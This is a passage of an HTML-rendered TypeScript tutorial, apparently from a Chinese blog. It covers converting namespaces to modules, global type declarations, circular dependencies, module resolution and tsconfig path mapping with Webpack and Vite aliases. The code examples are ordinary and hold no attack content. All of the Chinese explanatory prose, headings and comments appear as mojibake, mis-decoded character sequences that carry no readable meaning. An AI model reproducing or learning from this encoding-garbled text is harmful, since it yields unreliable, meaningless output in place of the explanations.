class_">Triangle</span>();<br></code></pre></td></tr></table></figure><p>åœºæ™¯ï¼šå‘½åç©ºé—´å°è£…æ¨¡å—ç±»å‹</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ä¸ºç¬¬ä¸‰æ–¹æ¨¡å—å£°æ˜å…¨å±€ç±»å‹</span><br><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;<br><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">global</span> &#123;<br>  <span class="hljs-keyword">namespace</span> <span class="hljs-title class_">JSX</span> &#123;<br>    <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IntrinsicElements</span> &#123;<br>      <span class="hljs-attr">customElement</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">DetailedHTMLProps</span>&lt;<br>        <span class="hljs-title class_">React</span>.<span class="hljs-property">HTMLAttributes</span>&lt;<span class="hljs-title class_">HTMLElement</span>&gt;,<br>        <span class="hljs-title class_">HTMLElement</span><br>      &gt;;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å·¥ç¨‹è¿ç§»ç­–ç•¥</strong></p><p>æ­¥éª¤1ï¼šå‘½åç©ºé—´è½¬æ¨¡å—</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åŸå‘½åç©ºé—´ä»£ç </span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Utilities</span> &#123;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">log</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/*...*/</span> &#125;<br>&#125;<br><br><span class="hljs-comment">// è½¬æ¢ä¸ºæ¨¡å—</span><br><span class="hljs-comment">// utilities.ts</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">log</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/*...*/</span> &#125;<br></code></pre></td></tr></table></figure><p>æ­¥éª¤2ï¼šå¤„ç†å…¨å±€ä¾èµ–</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åŸå…¨å±€ä¾èµ–</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">App</span> &#123;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> config = &#123; <span class="hljs-attr">debug</span>: <span class="hljs-literal">true</span> &#125;;<br>&#125;<br><br><span class="hljs-comment">// è½¬æ¢ä¸ºå•ä¾‹æ¨¡å—</span><br><span class="hljs-comment">// config.ts</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> config = &#123; <span class="hljs-attr">debug</span>: <span class="hljs-literal">true</span> &#125;;<br><br><span class="hljs-comment">// ä½¿ç”¨å¤„æ”¹ä¸ºå¯¼å…¥</span><br><span class="hljs-keyword">import</span> &#123; config &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./config&#x27;</span>;<br></code></pre></td></tr></table></figure><p>æ­¥éª¤3ï¼šå¤„ç†å¤šæ–‡ä»¶å‘½åç©ºé—´</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åŸå¤šæ–‡ä»¶å‘½åç©ºé—´</span><br><span class="hljs-comment">/// &lt;reference path=&quot;validation.ts&quot; /&gt;</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Validation</span> &#123;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmailValidator</span> &#123; <span class="hljs-comment">/*...*/</span> &#125;<br>&#125;<br><br><span class="hljs-comment">// è½¬æ¢ä¸ºæ¨¡å—</span><br><span class="hljs-comment">// EmailValidator.ts</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Validator</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./validation&#x27;</span>; <span class="hljs-comment">// è½¬æ¢ä¸ºæ¨¡å—</span><br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmailValidator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Validator</span> &#123; <span class="hljs-comment">/*...*/</span> &#125;<br></code></pre></td></tr></table></figure><p><strong>æœ€ä½³å®è·µæŒ‡å—</strong></p><ol><li>æ–°é¡¹ç›®å¼ºåˆ¶ä½¿ç”¨æ¨¡å—ï¼š</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">// tsconfig.json</span><br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;compilerOptions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;module&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ESNext&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;moduleResolution&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;NodeNext&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>æ—§é¡¹ç›®æ¸è¿›è¿ç§»ï¼š<ul><li>æ–°æ–‡ä»¶ä½¿ç”¨æ¨¡å—è¯­æ³•</li><li>æ—§æ–‡ä»¶ä¿æŒå‘½åç©ºé—´</li><li>ä½¿ç”¨export as namespaceæä¾›å…¨å±€è®¿é—®</li></ul></li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// legacy.d.ts</span><br><span class="hljs-keyword">export</span> = <span class="hljs-title class_">MyLib</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">namespace</span> <span class="hljs-title class_">myLib</span>;<br></code></pre></td></tr></table></figure><ol start="3"><li>é¿å…å…¨å±€æ‰©å±•æ±¡æŸ“ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ä¸æ¨èï¼šæ±¡æŸ“å…¨å±€å‘½åç©ºé—´</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">global</span> &#123;<br>  <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Window</span> &#123;<br>    <span class="hljs-attr">myGlobalVar</span>: <span class="hljs-built_in">any</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// æ¨èï¼šæ¨¡å—å°è£…</span><br><span class="hljs-comment">// my-module.ts</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">window</span>.<span class="hljs-property">myGlobalVar</span> = &#123; <span class="hljs-comment">/*...*/</span> &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="4"><li>ç±»å‹å£°æ˜ç­–ç•¥ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ç°ä»£æ¨¡å—ç±»å‹å£°æ˜</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;modern-lib&#x27;</span> &#123;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">calculate</span>(<span class="hljs-params"></span>): <span class="hljs-built_in">number</span>;<br>&#125;<br><br><span class="hljs-comment">// å‘½åç©ºé—´ç±»å‹å£°æ˜</span><br><span class="hljs-keyword">declare</span> <span class="hljs-keyword">namespace</span> <span class="hljs-title class_">LegacyLib</span> &#123;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">version</span>: <span class="hljs-built_in">string</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ</strong></p><p>é—®é¢˜ï¼šå…¨å±€ç±»å‹å†²çª</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// file1.ts</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">MyApp</span> &#123;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> version = <span class="hljs-string">&quot;1.0&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// file2.ts</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">MyApp</span> &#123; <span class="hljs-comment">// âŒ å¯èƒ½ä¸å…¶ä»–æ–‡ä»¶åˆå¹¶</span><br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">log</span>(<span class="hljs-params"></span>) &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// è½¬æ¢ä¸ºæ¨¡å—åŒ–</span><br><span class="hljs-comment">// version.ts</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> version = <span class="hljs-string">&quot;1.0&quot;</span>;<br><br><span class="hljs-comment">// logger.ts</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">log</span>(<span class="hljs-params"></span>) &#123;&#125;<br></code></pre></td></tr></table></figure><p>é—®é¢˜ï¼šç¬¬ä¸‰æ–¹åº“å…¨å±€æ‰©å±•</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ‰©å±•jQuery</span><br><span class="hljs-keyword">declare</span> <span class="hljs-keyword">namespace</span> <span class="hljs-title class_">JQuery</span> &#123;<br>  <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Static</span> &#123;<br>    <span class="hljs-title function_">newPlugin</span>(): <span class="hljs-built_in">void</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ç°ä»£æ–¹æ¡ˆï¼šæ¨¡å—å¢å¼º</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;jquery&#x27;</span> &#123;<br>  <span class="hljs-keyword">interface</span> <span class="hljs-title class_">JQueryStatic</span> &#123;<br>    <span class="hljs-title function_">newPlugin</span>(): <span class="hljs-built_in">void</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é—®é¢˜ï¼šå¾ªç¯ä¾èµ–</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å‘½åç©ºé—´ä¸­çš„å¾ªç¯å¼•ç”¨</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">A</span> &#123;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> b = B.<span class="hljs-property">value</span>; <span class="hljs-comment">// âŒ Bå°šæœªå®šä¹‰</span><br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">B</span> &#123;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> value = <span class="hljs-number">10</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¨¡å—åŒ–è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// a.ts</span><br><span class="hljs-keyword">import</span> &#123; value &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./b&#x27;</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> b = value;<br><br><span class="hljs-comment">// b.ts</span><br><span class="hljs-keyword">import</span> &#123; b &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./a&#x27;</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> value = b + <span class="hljs-number">10</span>; <span class="hljs-comment">// âŒ å¾ªç¯ä¾èµ–</span><br><br><span class="hljs-comment">// é‡æ„ï¼šæå–å…¬å…±é€»è¾‘</span><br><span class="hljs-comment">// constants.ts</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">BASE_VALUE</span> = <span class="hljs-number">5</span>;<br><br><span class="hljs-comment">// a.ts</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-variable constant_">BASE_VALUE</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./constants&#x27;</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> a = <span class="hljs-variable constant_">BASE_VALUE</span> * <span class="hljs-number">2</span>;<br><br><span class="hljs-comment">// b.ts</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-variable constant_">BASE_VALUE</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./constants&#x27;</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> b = <span class="hljs-variable constant_">BASE_VALUE</span> * <span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure><h3 id="1-4-3-æ¨¡å—è§£æç­–ç•¥ä¸è·¯å¾„æ˜ å°„"><a href="#1-4-3-æ¨¡å—è§£æç­–ç•¥ä¸è·¯å¾„æ˜ å°„" class="headerlink" title="1.4.3 æ¨¡å—è§£æç­–ç•¥ä¸è·¯å¾„æ˜ å°„"></a>1.4.3 æ¨¡å—è§£æç­–ç•¥ä¸è·¯å¾„æ˜ å°„</h3><p><strong>æ¨¡å—è§£æç­–ç•¥</strong></p><p>TypeScript æ”¯æŒä¸¤ç§æ¨¡å—è§£æç­–ç•¥ï¼š</p><table><thead><tr><th align="left">ç­–ç•¥</th><th align="left">è§¦å‘æ¡ä»¶</th><th align="left">è§£æé€»è¾‘</th><th align="left">é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left">Classic</td><td align="left">â€œmoduleResolutionâ€: â€œClassicâ€</td><td align="left">1. ç›¸å¯¹è·¯å¾„ï¼š.&#x2F;module â†’ .&#x2F;module.ts<br>2. éç›¸å¯¹è·¯å¾„ï¼šmodule â†’ .&#x2F;module.ts â†’ ..&#x2F;module.ts</td><td align="left">TS 1.6 å‰æ—§é¡¹ç›®</td></tr><tr><td align="left">Node</td><td align="left">â€œmoduleResolutionâ€: â€œNodeâ€<br>(é»˜è®¤å€¼)</td><td align="left">éµå¾ª Node.js è§£æè§„åˆ™ï¼š<br>1. æ£€æŸ¥æ–‡ä»¶<br>2. æ£€æŸ¥ç›®å½•<br>3. æ£€æŸ¥ package.json<br>4. æ£€æŸ¥ @typesç°ä»£</td><td align="left">Node.js&#x2F;Web é¡¹ç›®</td></tr></tbody></table><p>Node ç­–ç•¥è§£ææµç¨‹ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">import</span> &#123; helper &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;my-utils&#x27;</span>;<br><span class="hljs-comment">// è§£ææ­¥éª¤ï¼š</span><br><span class="hljs-comment">// 1. æ£€æŸ¥æ–‡ä»¶: node_modules/my-utils.ts</span><br><span class="hljs-comment">// 2. æ£€æŸ¥æ–‡ä»¶: node_modules/my-utils.tsx</span><br><span class="hljs-comment">// 3. æ£€æŸ¥æ–‡ä»¶: node_modules/my-utils.d.ts</span><br><span class="hljs-comment">// 4. æ£€æŸ¥ç›®å½•: node_modules/my-utils/package.json (main/types å­—æ®µ)</span><br><span class="hljs-comment">// 5. æ£€æŸ¥ç›®å½•: node_modules/my-utils/index.ts</span><br><span class="hljs-comment">// 6. æ£€æŸ¥ä¸Šçº§ node_modules: ../node_modules/my-utils</span><br></code></pre></td></tr></table></figure><p><strong>è·¯å¾„æ˜ å°„ï¼ˆPath Mappingï¼‰</strong></p><p>æ ¸å¿ƒç›®çš„ï¼šç®€åŒ–æ¨¡å—å¯¼å…¥è·¯å¾„ï¼Œé¿å…ç›¸å¯¹è·¯å¾„åµŒå¥—</p><p>é…ç½®æ–¹å¼ (tsconfig.json)ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;compilerOptions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;baseUrl&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;./src&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;paths&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@components/*&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;components/*&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;@utils&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;utils/index&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;shared/*&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;../shared/*&quot;</span><span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>æ˜ å°„è§„åˆ™è§£æï¼š</p><table><thead><tr><th align="left">æ˜ å°„é…ç½®</th><th align="left">å¯¼å…¥è¯­å¥</th><th align="left">è§£æè·¯å¾„</th></tr></thead><tbody><tr><td align="left"><code>&quot;@components/*&quot;</code><br><code>[&quot;components/*&quot;]</code></td><td align="left"><code>import Button from &#39;@components/Button&#39;</code></td><td align="left"><code>./src/components/Button.ts</code></td></tr><tr><td align="left"><code>&quot;@utils&quot;</code><br><code>[&quot;utils/index&quot;]</code></td><td align="left"><code>import &#123; log &#125; from &#39;@utils&#39;</code></td><td align="left"><code>./src/utils/index.ts</code></td></tr><tr><td align="left"><code>&quot;shared/*&quot;</code><br><code>[&quot;../shared/*&quot;]</code></td><td align="left"><code>import config from &#39;shared/config&#39;</code></td><td align="left"><code>../shared/config.ts</code></td></tr></tbody></table><p><strong>è·¯å¾„æ˜ å°„ç±»å‹å£°æ˜</strong></p><p>åœºæ™¯ï¼šä¸ºè·¯å¾„æ˜ å°„æä¾›ç±»å‹æ”¯æŒ</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// src/global.d.ts</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;@components/*&#x27;</span> &#123;<br>  <span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">ComponentType</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span>;<br>  <span class="hljs-keyword">const</span> <span class="hljs-attr">component</span>: <span class="hljs-title class_">ComponentType</span>;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> component;<br>&#125;<br><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;@utils&#x27;</span> &#123;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">log</span>(<span class="hljs-params"><span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">void</span>;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">version</span>: <span class="hljs-built_in">string</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å·¥ç¨‹æœ€ä½³å®è·µ</strong></p><ol><li>åŸºç¡€è·¯å¾„é…ç½®ï¼š</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;compilerOptions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;baseUrl&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;src&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// æ‰€æœ‰éç»å¯¹è·¯å¾„ç›¸å¯¹srcè§£æ</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-comment">// ä½¿ç”¨</span><br>import utils from &#x27;utils&#x27;; <span class="hljs-comment">// è§£æä¸º src/utils.ts</span><br></code></pre></td></tr></table></figure><ol start="2"><li>å¤šè·¯å¾„æ˜ å°„æ¨¡å¼ï¼š</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;paths&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-comment">// å¤šè·¯å¾„å›é€€</span><br>    <span class="hljs-attr">&quot;@services/*&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-string">&quot;services/v2/*&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// ä¼˜å…ˆå°è¯•v2</span><br>      <span class="hljs-string">&quot;services/v1/*&quot;</span>  <span class="hljs-comment">// å›é€€åˆ°v1</span><br>    <span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><ol start="3"><li>é€šé…ç¬¦æ‰©å±•ï¼š</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;paths&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@assets/*&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;assets/*&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;assets/images/*&quot;</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">// å¤šç›®å½•æ˜ å°„</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><ol start="4"><li>ç»å¯¹è·¯å¾„æ˜ å°„ï¼š</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;baseUrl&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;.&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;paths&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;src/*&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;src/*&quot;</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">// å…è®¸ import from &#x27;src/components&#x27;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>è·¯å¾„æ˜ å°„ä¸æ‰“åŒ…å™¨é›†æˆ</strong></p><p>Webpack é…ç½®ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">resolve</span>: &#123;<br>    <span class="hljs-attr">alias</span>: &#123;<br>      <span class="hljs-string">&#x27;@components&#x27;</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;src/components&#x27;</span>),<br>      <span class="hljs-string">&#x27;@utils&#x27;</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;src/utils&#x27;</span>)<br>    &#125;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>Vite é…ç½®ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// vite.config.ts</span><br><span class="hljs-keyword">import</span> &#123; defineConfig &#125; 